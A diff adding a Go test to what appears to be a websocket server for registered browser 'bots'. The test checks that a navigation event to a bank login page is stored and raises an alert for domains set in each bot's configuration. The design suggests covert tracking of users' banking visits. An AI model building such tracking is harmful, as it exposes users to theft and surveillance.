@@ -496,3 +496,66 @@ func TestWS_CapabilityHookRunsAfterRegistrationWithoutBlockingReadLoop(t *testin
 	}
 	close(unblockHook)
 }
+
+func TestWS_NavEventPersistsAndRaisesDomainAlert(t *testing.T) {
+	gdb := newWSDB(t)
+	srv := New(gdb, utils.NewLogger())
+	url, stop := runServer(t, srv)
+	defer stop()
+
+	ctx, cancel := context.WithTimeout(t.Context(), 5*time.Second)
+	defer cancel()
+	conn, _, err := websocket.Dial(ctx, url, nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer conn.Close(websocket.StatusNormalClosure, "")
+
+	_, msg, _ := conn.Read(ctx)
+	var probe Envelope
+	_ = json.Unmarshal(msg, &probe)
+	browserID := uuid.NewString()
+	authData, _ := json.Marshal(AuthData{BrowserID: browserID})
+	b, _ := json.Marshal(Envelope{ID: probe.ID, Action: ActionAuth, Data: authData, OriginAction: ActionAuth})
+	if err := conn.Write(ctx, websocket.MessageText, b); err != nil {
+		t.Fatal(err)
+	}
+
+	var sess *Session
+	deadline := time.Now().Add(2 * time.Second)
+	for time.Now().Before(deadline) {
+		sess = srv.Registry().ByBrowserID(browserID)
+		if sess != nil {
+			break
+		}
+		time.Sleep(20 * time.Millisecond)
+	}
+	if sess == nil {
+		t.Fatal("bot not registered")
+	}
+
+	if err := gdb.Model(&models.Bot{}).Where("id = ?", sess.BotID).Updates(map[string]any{
+		"switch_config": models.JSONMap{"NOTIFICATION": true},
+		"data_config":   models.JSONMap{"NOTIFICATION_DOMAINS": []any{"bank.example"}},
+	}).Error; err != nil {
+		t.Fatal(err)
+	}
+
+	nav, _ := json.Marshal(map[string]any{"url": "https://app.bank.example/login", "title": "Login", "timestamp": float64(time.Now().UnixMilli())})
+	env, _ := json.Marshal(Envelope{ID: uuid.NewString(), Action: ActionNavEvent, Data: nav})
+	if err := conn.Write(ctx, websocket.MessageText, env); err != nil {
+		t.Fatal(err)
+	}
+
+	deadline = time.Now().Add(2 * time.Second)
+	var navCount, alertCount int64
+	for time.Now().Before(deadline) {
+		gdb.Model(&models.BotNavEvent{}).Where("bot_id = ?", sess.BotID).Count(&navCount)
+		gdb.Model(&models.BotAlert{}).Where("bot_id = ?", sess.BotID).Count(&alertCount)
+		if navCount == 1 && alertCount == 1 {
+			return
+		}
+		time.Sleep(20 * time.Millisecond)
+	}
+	t.Fatalf("nav=%d alert=%d, want 1/1", navCount, alertCount)
+}
